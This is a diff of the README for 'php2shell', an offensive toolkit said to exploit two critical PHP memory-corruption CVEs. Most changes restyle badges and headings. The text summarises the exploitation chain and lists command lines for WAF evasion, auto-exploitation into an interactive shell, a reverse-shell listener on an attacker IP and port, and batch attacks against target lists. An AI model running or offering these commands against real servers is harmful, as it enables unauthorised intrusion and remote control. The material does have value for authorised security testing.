@@ -8,18 +8,22 @@
 > 
 > **The creators, contributors, and maintainers accept NO responsibility or liability** for any damage, service disruption, data loss, or legal consequences resulting from the misuse or deployment of this software. By cloning, downloading, viewing, or running this toolkit, you explicitly agree to use it exclusively on systems and networks you own or are legally authorized to test.
 
----
+<p align="center">
+  <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-109618"><img src="https://img.shields.io/badge/CVE--2026--109618-CRITICAL%20(9.2)-e74c3c?style=for-the-badge" alt="CVE-2026-109618"></a>
+  <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-109619"><img src="https://img.shields.io/badge/CVE--2026--109619-CRITICAL%20(9.2)-e74c3c?style=for-the-badge" alt="CVE-2026-109619"></a>
+  <a href="https://www.exploit-db.com/exploits/52704"><img src="https://img.shields.io/badge/EXPLOIT--DB-%2352704-e67e22?style=for-the-badge" alt="Exploit-DB #52704"></a>
+</p>
 
-[![CVE-2026-109618](https://img.shields.io/badge/CVE--2026--109618-Critical%20(9.2)-red)](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-109618)
-[![CVE-2026-109619](https://img.shields.io/badge/CVE--2026--109619-Critical%20(9.2)-red)](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-109619)
-[![Exploit-DB](https://img.shields.io/badge/Exploit--DB-%2352704-orange)](https://www.exploit-db.com/exploits/52704)
-[![Python](https://img.shields.io/badge/Python-3.9+-blue)](https://www.python.org/)
-[![Toolkit Version](https://img.shields.io/badge/Toolkit-v2.2.0-brightgreen)](php2shell.py)
-[![License](https://img.shields.io/badge/License-MIT-green)](LICENSE)
+<p align="center">
+  <img src="https://img.shields.io/badge/PYTHON-3.9+-3776AB?style=for-the-badge&logo=python&logoColor=white" alt="Python">
+  <a href="php2shell.py"><img src="https://img.shields.io/badge/TOOLKIT-V2.2.0-2ecc71?style=for-the-badge" alt="Toolkit"></a>
+  <a href="LICENSE"><img src="https://img.shields.io/badge/LICENSE-MIT-3498db?style=for-the-badge" alt="License"></a>
+</p>
 
-**Comprehensive research, defensive auditing, and unified exploitation suite for CVE-2026-109618 & CVE-2026-109619 — critical PHP core vulnerabilities.**
-
-Features an all-in-one script ([`php2shell.py`](php2shell.py)) delivering a complete end-to-end pipeline from **Reconnaissance → Passive Fingerprinting → Behavioral Probing → WAF Evasion → Weaponized Exploitation → Interactive Shell Console / Reverse Listener**.
+<p align="center">
+  <strong>Comprehensive research, defensive auditing, and unified exploitation suite for CVE-2026-109618 & CVE-2026-109619 — critical PHP core vulnerabilities.</strong><br>
+  <em>Features an all-in-one script (<code>php2shell.py</code>) delivering an end-to-end pipeline: Recon → Passive Fingerprinting → Behavioral Probing → WAF Evasion → Weaponized Exploitation → Interactive Shell / Reverse Listener.</em>
+</p>
 
 ---
 
@@ -32,7 +36,7 @@ PHP2Shell provides discovery, differential analysis, and weaponized verification
 | **CVE-2026-109618** | RFC 1867 OOM Uninitialized Memory Corruption | **9.2** Critical | PHP 5.4 – 8.2 (< 8.2.35), 8.3 (< 8.3.36), 8.4 (< 8.4.27), 8.5 (< 8.5.12) | **8.2.35, 8.3.36, 8.4.27, 8.5.12** |
 | **CVE-2026-109619** | Stale Global State (`SG()` / `PG()`) Use-After-Free | **9.2** Critical | PHP 5.4 – 8.2 (< 8.2.35), 8.3 (< 8.3.36), 8.4 (< 8.4.27), 8.5 (< 8.5.12) | **8.2.35, 8.3.36, 8.4.27, 8.5.12** |
 
-### Exploitation Chain Summary
+### ⛓️ Exploitation Chain Summary
 1. **RFC 1867 OOM Bailout**: Deeply nested multipart arrays induce a memory allocation error triggering `zend_bailout()`, bypassing standard request cleanup.
 2. **Worker State Poisoning (UAF)**: Persistent HTTP/1.1 Keep-Alive connections reuse the same worker process (`mod_php` or `PHP-FPM`), causing the subsequent request to dereference uninitialized or freed memory.
 3. **Exploit-DB #52704 Chain**:
@@ -84,7 +88,7 @@ PHP2Shell provides discovery, differential analysis, and weaponized verification
 
 ## 📦 Installation & Setup
 
-### Prerequisites
+### ⚙️ Prerequisites
 - Python 3.9 or higher
 - `pip` package manager
 
@@ -103,12 +107,12 @@ pip install -r requirements.txt
 
 The primary script ([`php2shell.py`](php2shell.py)) handles all tasks in one single file:
 
-### 1. Full Pipeline Execution (Recon → Passive → Probes → WAF → Exploit)
+### 🚀 1. Full Pipeline Execution (Recon → Passive → Probes → WAF → Exploit)
 ```bash
 python php2shell.py http://127.0.0.1:8899/ --all -v
 ```
 
-### 2. Reconnaissance with Custom Wordlist or Remote SecLists
+### 🔍 2. Reconnaissance with Custom Wordlist or Remote SecLists
 ```bash
 # Using a local custom wordlist
 python php2shell.py http://target.lab:8088/ --recon -w my_wordlist.txt -v
@@ -117,17 +121,17 @@ python php2shell.py http://target.lab:8088/ --recon -w my_wordlist.txt -v
 python php2shell.py http://target.lab:8088/ --recon --remote-wordlist -v
 ```
 
-### 3. Auto-Exploit and Drop Into Live Interactive Shell Console
+### 💻 3. Auto-Exploit and Drop Into Live Interactive Shell Console
 ```bash
 python php2shell.py http://target.lab:8088/ --all --shell
 ```
 
-### 4. Built-in Interactive Reverse Shell Listener
+### 📡 4. Built-in Interactive Reverse Shell Listener
 ```bash
 python php2shell.py http://target.lab:8088/ --all --lhost 10.10.14.5 --lport 4444
 ```
 
-### 5. Direct Exploit-DB #52704 Binary Leak Execution
+### 🎯 5. Direct Exploit-DB #52704 Binary Leak Execution
 ```bash
 python php2shell.py http://target.lab:8088/index.php \
   --exploit \
@@ -137,7 +141,7 @@ python php2shell.py http://target.lab:8088/index.php \
   --proof-file /tmp/pwn
 ```
 
-### 6. Multi-Target Batch Audit with Report Export
+### 📊 6. Multi-Target Batch Audit with Report Export
 ```bash
 python php2shell.py -f targets.txt --threads 20 --recon --active --waf -o audit_report
 ```
